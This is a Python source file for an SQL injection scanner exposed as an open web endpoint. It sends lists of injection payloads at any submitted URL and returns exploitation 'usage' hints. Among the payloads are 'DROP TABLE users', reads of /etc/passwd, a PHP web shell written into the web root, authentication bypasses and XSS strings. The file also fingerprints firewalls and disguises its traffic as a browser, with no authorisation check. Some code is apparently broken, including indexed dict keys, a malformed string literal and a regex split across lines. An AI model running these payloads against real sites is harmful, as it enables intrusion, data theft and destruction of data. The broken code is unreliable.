import asyncio
import aiohttp
import re
import time
import urllib.parse
from typing import List, Dict, Any
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class SQLInjectionScanner:
    def __init__(self):
        self.session = None
        self.payloads = {
            'error_based': [
                "'",
                "''",
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' AND 1=CONVERT(int,@@version)--",
                "'; DROP TABLE users; --",
                "' OR 1=1#",
                "' UNION SELECT user(),database(),version()--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' OR 1=1 LIMIT 1--",
                "' UNION SELECT table_name FROM information_schema.tables--",
                "' UNION SELECT column_name FROM information_schema.columns--",
                "' UNION SELECT username,password FROM users--",
                "' AND 1=2 UNION SELECT * FROM admin--",
                "' OR 1=1 ORDER BY 1--",
                "' OR 1=1 ORDER BY 2--",
                "' OR 1=1 ORDER BY 3--",
                "' OR 1=1 GROUP BY 1--",
                "' HAVING 1=1--",
                "' AND 1=1--",
                "' AND 1=2--",
                "' OR SLEEP(5)--",
                "' OR pg_sleep(5)--",
                "'; WAITFOR DELAY '0:0:5'--",
                "' OR 1=1 INTO OUTFILE '/tmp/test.txt'--",
                "' UNION SELECT load_file('/etc/passwd')--",
                "' UNION SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/shell.php'--",
                "' OR 1=1 UNION SELECT NULL,NULL,NULL--",
                "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
            ],
            'blind': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND SLEEP(5)--",
                "' AND (SELECT COUNT(*) FROM users)>0--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",
                "' AND ASCII(SUBSTRING((SELECT database()),1,1))=115--",
                "' AND IF(1=1,SLEEP(5),0)--",
                "' AND CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END--",
                "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin')--",
                "' AND (SELECT LENGTH(database()))>5--",
                "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>5--",
            ],
            'time_based': [
                "'; WAITFOR DELAY '0:0:5'--",
                "' OR pg_sleep(5)--",
                "'; SELECT pg_sleep(5)--",
                "' OR SLEEP(5)--",
                "' AND (SELECT COUNT(*) FROM users WHERE SLEEP(5))--",
                "' OR IF(1=1,SLEEP(5),0)--",
                "' OR (SELECT CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END)--",
                "' OR (SELECT COUNT(*) FROM information_schema.tables WHERE SLEEP(5))--",
            ],
            'union_based': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT user(),database(),version()--",
                "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
                "' UNION SELECT username,password FROM users--",
                "' UNION SELECT * FROM admin--",
                "' UNION SELECT load_file('/etc/passwd'),NULL--",
                "' UNION SELECT @@version,NULL,NULL--",
                "' UNION SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema=database()--",
            ],
            'auth_bypass': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 1=1#",
                "admin'--",
                "admin' #",
                "admin'/*",
                "' or 1=1 or ''='",
                "' or 1=1--",
                "' or 1=1#",
                "' or 1=1/*",
                "') or '1'='1--",
                "') or ('1'='1--",
                "1' OR '1'='1",
                "1' OR 1 -- -",
                "1' OR 1=1--",
                "1' OR 1=1#",
                "1' OR 1=1/*",
                "1'admin' OR '1'='1",
                "1' or '1'='1",
                "1' or 1 -- -",
                "1' or 1=1--",
                "1' or 1=1#",
                "1' or 1=1/*",
            ],
            'xss_combo': [
                "'><script>alert('XSS')</script>",
                "'><img src=x onerror=alert('XSS')>",
                "'><svg/onload=alert('XSS')>",
                "'; DROP TABLE users; -- <script>alert('XSS')</script>",
                "' UNION SELECT '<script>alert(1)</script>',NULL--",
                "' OR 1=1; <script>alert('XSS')</script>--",
                "'><iframe src=javascript:alert('XSS')>",
                "'"><script>document.cookie='hacked=1'</script>",
                "'><body onload=alert('XSS')>",
                "'><div onmouseover=alert('XSS')>hover me</div>",
            ]
        }

    async def create_session(self):
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=30)
        timeout = aiohttp.ClientTimeout(total=30)
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
        )

    async def close_session(self):
        if self.session:
            await self.session.close()

    async def detect_waf(self, url: str) -> bool:
        """Detect if WAF is present"""
        waf_payloads = [
            "' AND 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables --",
            "<script>alert('XSS')</script>",
            "' OR 1=1--",
            "'; DROP TABLE users; --"
        ]
        
        for payload in waf_payloads[:2]:
            test_url = self.inject_payload(url, payload)
            try:
                async with self.session.get(test_url) as response:
                    text = await response.text()
                    waf_signatures = [
                        'cloudflare', 'akamai', 'sucuri', 'incapsula',
                        'fortinet', 'f5', 'barracuda', 'mod_security',
                        'access denied', 'forbidden', 'blocked',
                        'security violation', 'waf', 'firewall'
                    ]
                    if any(sig.lower() in text.lower() for sig in waf_signatures):
                        return True
            except:
                continue
        return False

    def inject_payload(self, url: str, payload: str) -> str:
        """Inject payload into URL parameters"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            return url
        
        # Inject into first parameter
        first_param = list(params.keys())[0]
        params[first_param] = [payload]
        
        new_query = urllib.parse.urlencode(params, doseq=True)
        new_url = urllib.parse.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))
        
        return new_url

    async def test_payload(self, url: str, payload: str, payload_type: str) -> Dict[str, Any]:
        """Test a single payload"""
        test_url = self.inject_payload(url, payload)
        
        try:
            start_time = time.time()
            async with self.session.get(test_url) as response:
                response_time = time.time() - start_time
                text = await response.text()
                
                # Error-based detection
                error_patterns = [
                    r'SQL syntax.*MySQL',
                    r'Warning.*mysql_.*',
                    r'valid MySQL result',
                    r'MySqlClient\.',
                    r'PostgreSQL.*ERROR',
                    r'Warning.*pg_.*',
                    r'valid PostgreSQL result',
                    r'Npgsql\.',
                    r'Driver.*SQL.*Server',
                    r'OLE DB.*SQL Server',
                    r'(\W|\A)SQL.*Server.*Driver',
                    r'Warning.*mssql_.*',
                    r'(\W|\A)SQL.*Server.*[0-9a-fA-F]{8}',
                    r'Exception.*Oracle',
                    r'Oracle error',
                    r'Oracle.*Driver',
                    r'Warning.*oci_.*',
                    r'Warning.*ora_.*',
                    r'Microsoft.*OLE.*DB.*Oracle',
                    r'Microsoft.*OLE.*DB.*SQL.*Server',
                    r'SQLite/JDBCDriver',
                    r'SQLite.*Driver',
                    r'Warning.*sqlite_.*',
                    r'Warning.*SQLite3::',
                    r'
 $$SQLite_ERROR$$ ',
                    r'SQLite.*exception',
                    r'org\.sqlite\.JDBC',
                    r'PDOException',
                    r'DB2 SQL error',
                    r'DB2.*Driver',
                    r'Warning.*db2_.*',
                    r'Sybase.*Server.*message',
                    r'Sybase.*Driver',
                    r'Warning.*sybase_.*',
                    r'XPathException',
                    r'Warning.*SimpleXMLElement::',
                    r'Warning.*preg_.*',
                    r'Warning.*Division by zero',
                    r'Warning.*file_.*',
                    r'Failed opening.*for inclusion',
                    r'Warning.*include.*failed',
                    r'Warning.*require.*failed',
                    r'fatal error',
                    r'unexpected T_.* in',
                    r'Parse error',
                    r'Warning:.*',
                    r'Error:.*',
                    r'Notice:.*'
                ]
                
                # Check for SQL errors
                for pattern in error_patterns:
                    if re.search(pattern, text, re.IGNORECASE):
                        return {
                            'type': 'Error-Based SQL Injection',
                            'severity': 'Critical',
                            'parameter': urllib.parse.parse_qs(urllib.parse.urlparse(test_url).query).keys()[0],
                            'payload': payload,
                            'description': f'Database error detected: {pattern}',
                            'usage': f'Use payload: {payload} in {urllib.parse.parse_qs(urllib.parse.urlparse(test_url).query).keys()[0]} parameter'
                        }
                
                # Time-based detection
                if payload_type == 'time_based' and response_time > 4:
                    return {
                        'type': 'Time-Based Blind SQL Injection',
                        'severity': 'High',
                        'parameter': urllib.parse.parse_qs(urllib.parse.urlparse(test_url).query).keys()[0],
                        'payload': payload,
                        'description': f'Delayed response detected ({response_time:.2f}s)',
                        'usage': f'Test with: {test_url}'
                    }
                
                # Union-based detection
                if payload_type == 'union_based':
                    # Look for injection markers in response
                    union_indicators = ['1', '2', '3', 'user()', 'database()', 'version()']
                    for indicator in union_indicators:
                        if indicator in text and indicator in payload:
                            return {
                                'type': 'Union-Based SQL Injection',
                                'severity': 'High',
                                'parameter': urllib.parse.parse_qs(urllib.parse.urlparse(test_url).query).keys()[0],
                                'payload': payload,
                                'description': 'Union injection successful - data reflected in response',
                                'usage': f'Enumerate data with: {payload.replace("NULL", "table_name")} FROM information_schema.tables'
                            }
                
                # Blind detection
                if payload_type == 'blind':
                    # Check for different responses
                    normal_url = self.inject_payload(url, "1")
                    async with self.session.get(normal_url) as normal_response:
                        normal_text = await normal_response.text()
                        
                        if len(text) != len(normal_text) or text != normal_text:
                            return {
                                'type': 'Blind SQL Injection',
                                'severity': 'Medium',
                                'parameter': urllib.parse.parse_qs(urllib.parse.urlparse(test_url).query).keys()[0],
                                'payload': payload,
                                'description': 'Different response detected - potential blind injection',
                                'usage': f'Use boolean conditions: {payload} AND 1=1 vs {payload} AND 1=2'
                            }
                
                # Auth bypass detection
                if payload_type == 'auth_bypass':
                    # Look for successful login indicators
                    success_indicators = ['welcome', 'dashboard', 'profile', 'logout', 'success']
                    for indicator in success_indicators:
                        if indicator.lower() in text.lower():
                            return {
                                'type': 'Authentication Bypass',
                                'severity': 'Critical',
                                'parameter': urllib.parse.parse_qs(urllib.parse.urlparse(test_url).query).keys()[0],
                                'payload': payload,
                                'description': 'Authentication bypass successful',
                                'usage': f'Test login bypass: username=admin{payload}&password=anything'
                            }
                
                # XSS combo detection
                if payload_type == 'xss_combo':
                    xss_indicators = ['<script>', 'alert(', 'onerror=', 'onload=']
                    for indicator in xss_indicators:
                        if indicator in text:
                            return {
                                'type': 'XSS + SQLi Combo',
                                'severity': 'High',
                                'parameter': urllib.parse.parse_qs(urllib.parse.urlparse(test_url).query).keys()[0],
                                'payload': payload,
                                'description': 'XSS payload reflected in response',
                                'usage': f'Full payload: {payload}'
                            }
                
        except asyncio.TimeoutError:
            return {
                'type': 'Time-Based SQL Injection',
                'severity': 'Medium',
                'parameter': urllib.parse.parse_qs(urllib.parse.urlparse(test_url).query).keys()[0],
                'payload': payload,
                'description': 'Request timeout - potential time-based injection',
                'usage': f'Test timeout with: {test_url}'
            }
        except Exception as e:
            logger.error(f"Error testing payload {payload}: {str(e)}")
        
        return None

    async def scan_url(self, url: str, options: Dict[str, bool]) -> Dict[str, Any]:
        """Main scanning function"""
        await self.create_session()
        
        try:
            # Detect WAF
            waf_detected = await self.detect_waf(url)
            
            vulnerabilities = []
            payloads_tested = 0
            
            # Test selected payload types
            for payload_type, enabled in options.items():
                if enabled and payload_type in self.payloads:
                    payloads = self.payloads[payload_type]
                    
                    # Use semaphore for rate limiting
                    semaphore = asyncio.Semaphore(10)
                    
                    async def test_with_semaphore(payload):
                        async with semaphore:
                            return await self.test_payload(url, payload, payload_type)
                    
                    # Test payloads concurrently
                    tasks = [test_with_semaphore(payload) for payload in payloads]
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    for result in results:
                        if isinstance(result, dict) and result:
                            vulnerabilities.append(result)
                        payloads_tested += 1
                    
                    # Add delay if WAF detected
                    if waf_detected:
                        await asyncio.sleep(1)
            
            return {
                'url': url,
                'waf_detected': waf_detected,
                'vulnerabilities': vulnerabilities,
                'payloads_tested': payloads_tested,
                'scan_timestamp': time.time()
            }
            
        finally:
            await self.close_session()

# Vercel serverless handler
async def handler(request):
    if request.method == 'OPTIONS':
        return {
            'statusCode': 200,
            'headers': {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'POST, OPTIONS',
                'Access-Control-Allow-Headers': 'Content-Type',
            },
            'body': ''
        }
    
    if request.method != 'POST':
        return {
            'statusCode': 405,
            'headers': {
                'Access-Control-Allow-Origin': '*',
                'Content-Type': 'application/json'
            },
            'body': json.dumps({'error': 'Method not allowed'})
        }
    
    try:
        body = await request.json()
        url = body.get('url')
        options = body.get('options', {})
        
        if not url:
            return {
                'statusCode': 400,
                'headers': {
                    'Access-Control-Allow-Origin': '*',
                    'Content-Type': 'application/json'
                },
                'body': json.dumps({'error': 'URL is required'})
            }
        
        scanner = SQLInjectionScanner()
        result = await scanner.scan_url(url, options)
        
        return {
            'statusCode': 200,
            'headers': {
                'Access-Control-Allow-Origin': '*',
                'Content-Type': 'application/json'
            },
            'body': json.dumps(result, indent=2)
        }
        
    except Exception as e:
        logger.error(f"Handler error: {str(e)}")
        return {
            'statusCode': 500,
            'headers': {
                'Access-Control-Allow-Origin': '*',
                'Content-Type': 'application/json'
            },
            'body': json.dumps({'error': str(e)})
        }

# For Vercel
import json
from aiohttp import web

async def vercel_handler(request):
    return await handler(request)

# For local development
if __name__ == '__main__':
    app = web.Application()
    app.router.add_post('/api/scan', vercel_handler)
    web.run_app(app, port=8000)
